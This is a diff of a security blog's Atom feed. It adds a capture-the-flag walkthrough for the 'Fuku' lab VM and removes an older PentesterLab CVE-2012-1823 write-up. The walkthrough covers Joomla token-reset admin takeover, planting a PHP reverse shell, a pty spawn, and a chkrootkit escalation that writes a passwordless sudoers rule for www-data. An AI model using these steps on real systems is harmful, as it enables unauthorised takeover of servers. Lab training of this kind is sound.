@@ -4,7 +4,7 @@
   <title><![CDATA[Bob1Bob2]]></title>
   <link href="http://wg135.github.io/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-07-15T13:23:22-05:00</updated>
+  <updated>2016-07-19T13:04:38-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -12,6 +12,178 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[SecTalks: BNE0x02 - Fuku]]></title>
+    <link href="http://wg135.github.io/blog/2016/07/18/sectalks-bne0x02-fuku/"/>
+    <updated>2016-07-18T16:00:27-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/07/18/sectalks-bne0x02-fuku</id>
+    <content type="html"><![CDATA[<h3>Tools:</h3>
+
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+<li>Netcat</li>
+<li>Wfuzz</li>
+<li>Nikto</li>
+<li>Joomscan</li>
+</ul>
+
+
+<h3>Vulnerability:</h3>
+
+<ul>
+<li><a href="https://www.exploit-db.com/exploits/6234/">Joomla 1.5.x - (Token) Remote Admin Change Password</a></li>
+<li><a href="https://www.exploit-db.com/exploits/38775/">Chkrootkit - Local Privilege Escalation</a></li>
+</ul>
+
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.56.0/24</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/fuku/Capture1.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.56.134 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.56.134 -p-</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/fuku/Capture2.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>as we can see, almost every port is opening. I guess the target machine doesn&rsquo;t want hacker know which services are exactly running.</p>
+
+<p>I use nc to read some ports such as 80 22 23. Port 22 gets result like:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>SSH-2.0-OpenSSH 6.7p1 Ububtu-5ubuntu1</span></code></pre></td></tr></table></div></figure>
+
+
+<p>while the rest of ports get the results:</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/fuku/Capture14.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>looks like I need to filter ports like these. I wrote a script to make life easier <a href="https://github.com/wg135/script/blob/master/filter.py">filter.py</a></p>
+
+<p>After running the script, I find only port 22 and port 13370 are opening.</p>
+
+<p>check the <a href="http://192.168.56.134:13370.">http://192.168.56.134:13370.</a> I got this</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/fuku/Capture3.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>review the code:</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/fuku/Capture4.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>Looks like Joomla!</p>
+
+<p>use wfuzz to scan</p>
+
+<p><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.56.134:13370/FUZZ 2&gt;/dev/null</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/fuku/Capture5.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>get some interesting path names</p>
+
+<p>use Nikto to scan</p>
+
+<p><code>nikto -h http://192.168.56.134:13370</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/fuku/Capture6.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>check <a href="http://192.168.56.134:13370/administrator/">http://192.168.56.134:13370/administrator/</a> get the login page:</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/fuku/Capture7.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>Now I can confirm it is Joomla!</p>
+
+<p>use joomscan to scan:</p>
+
+<p><code>joomscan -u http://192.168.56.134:13370</code></p>
+
+<p>get the result:</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/fuku/Capture8.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>follow the steps:</p>
+
+<ul>
+<li>go to <a href="http://192.168.56.134/index.php?option=com_user&amp;view=reset&amp;layout=confirm">http://192.168.56.134/index.php?option=com_user&amp;view=reset&amp;layout=confirm</a></li>
+<li>Write into field &ldquo;token&rdquo; char &lsquo; and Click OK.</li>
+</ul>
+
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/fuku/Capture15.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<ul>
+<li>input new password for admin</li>
+</ul>
+
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/fuku/Capture16.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<ul>
+<li>go to <a href="http://192.168.56.134/administrator/">http://192.168.56.134/administrator/</a> to login with new password</li>
+</ul>
+
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/fuku/Capture9.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>Since it is Japanese version, I followed my post <a href="http://wg135.github.io/blog/2016/05/31/vulhub-sickos1-dot-2/">sickos1.2</a> to upload php reverse shell (usr/share/webshells/php/php-reverse-shell.php).</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/fuku/Capture17.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>I will edit beez file, copy the php reverse shell code to it and replace the IP address and port</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/fuku/Capture10.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>set up netcat and get the shell</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/fuku/Capture11.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>However, I cannot execute most commands even <code>python</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/fuku/Capture12.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>try:</p>
+
+<p><code>python2.7 -c 'import pty; pty.spawn("/bin/bash")'</code></p>
+
+<p>works!</p>
+
+<p>Now try to enumerate the os.</p>
+
+<p><code>ps aux |grep root</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/fuku/Capture18.JPG" title="[title manually exploit [alt text]]" ></p>
+
+<p>looks like the <code>chkrootkit 0.49</code> is available.</p>
+
+<p>I followed my previous post <a href="http://wg135.github.io/blog/2016/05/31/vulhub-sickos1-dot-2/">sickos1.2</a> to upload php reverse shell (usr/share/webshells/php/php-reverse-shell.php) to get the root:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>echo 'chmod 777 /etc/sudoers && echo "www-data ALL=NOPASSWD: ALL" &gt;&gt; /etc/sudoers && chmod 440 /etc/sudoers' &gt; /tmp/update</span></code></pre></td></tr></table></div></figure>
+
+
+<p>then:</p>
+
+<p><code>chmod 777 /tmp/update</code></p>
+
+<p>then:</p>
+
+<p><code>ls -al /etc/sudoers</code></p>
+
+<p>finally get the root:</p>
+
+<p><code>sudo su</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/fuku/Capture13.JPG" title="[title manually exploit [alt text]]" ></p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[vulhub-sokar]]></title>
@@ -4053,82 +4225,6 @@ In Debian Linux, the tomcat configuration file tomcat-users.xml has default loca
 <p> <img src="http://wg135.github.io/images/blog/pentesterlab/cve_2007_1860/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
 
 <p>DONE</p>
-
-<p><img src="http://wg135.github.io/images/blog/pentesterlab/shellshock/game_over.jpg" title="[title manually exploit [alt text]]" ></p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Pentesterlab--cve-2012-1823]]></title>
-    <link href="http://wg135.github.io/blog/2016/03/30/pentesterlab-cve-2012-1823/"/>
-    <updated>2016-03-30T15:51:10-05:00</updated>
-    <id>http://wg135.github.io/blog/2016/03/30/pentesterlab-cve-2012-1823</id>
-    <content type="html"><![CDATA[<p><em>All warfare is based on deception. Hence, when we are able to attack, we must seem unable; when using our forces, we must appear inactive; when we are near, we must make the enemy believe we are far away; when far away, we must make him believe we are near.</em> &mdash;&ndash; The Art of War</p>
-
-<p>This course details the exploitation of the PHP CGI bug (CVE-2012-1823) and how an attacker can use it to retrieve arbitrary code and gain code execution on a server using this bug.</p>
-
-<p>Difficluty: 2/5</p>
-
-<!--more-->
-
-
-<h3>Forces:</h3>
-
-<ul>
-<li>Nmap</li>
-<li>NC</li>
-<li>Metasploit</li>
-</ul>
-
-
-<h3>Detail Assessment and Planning</h3>
-
-<ul>
-<li>Port scan to identify opened ports, running services and services version. &mdash;&ndash; Nmap</li>
-<li>Check php version and other http headers. &mdash;&ndash; NC</li>
-<li>Exploit and get the shell. &mdash;&ndash; Metasploit</li>
-</ul>
-
-
-<h3>Waging War</h3>
-
-<h4>Weaknesses and Strengths</h4>
-
-<p>Used Nmap to idenfity opened ports. TCP port 80 is opened and Apache service is running on it.</p>
-
-<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2012_1823/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>By checking the application HTTP headers with nc, I can get php version.</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-<span class='line-number'>2</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>GET / HTTP/1.1
-</span><span class='line'>Host: 192.168.79.166</span></code></pre></td></tr></table></div></figure>
-
-
-<p></p>
-
-<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2012_1823/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
-
-<h4>Attack</h4>
-
-<p>I got the php version is 5.3.3. If I seach this php version&rsquo;s vulnerability., I find that:</p>
-
-<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2012_1823/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>This is may be exploitable. Next I use metasploit to verify that. In msfconsole,</p>
-
-<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
-</pre></td><td class='code'><pre><code class=''><span class='line'>search php_cgi</span></code></pre></td></tr></table></div></figure>
-
-
-<p>Only one exploit pops up, which is <code>exploit/multi/http/php_cgi_arg_injection</code></p>
-
-<p>next just set RHOST, LHOST, PAYLOAD I use <code>generic/shell_reverse_tcp</code>. ATTACK!!!</p>
-
-<p><img src="http://wg135.github.io/images/blog/pentesterlab/cve_2012_1823/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
-
-<p>Done.</p>
 
 <p><img src="http://wg135.github.io/images/blog/pentesterlab/shellshock/game_over.jpg" title="[title manually exploit [alt text]]" ></p>
 ]]></content>
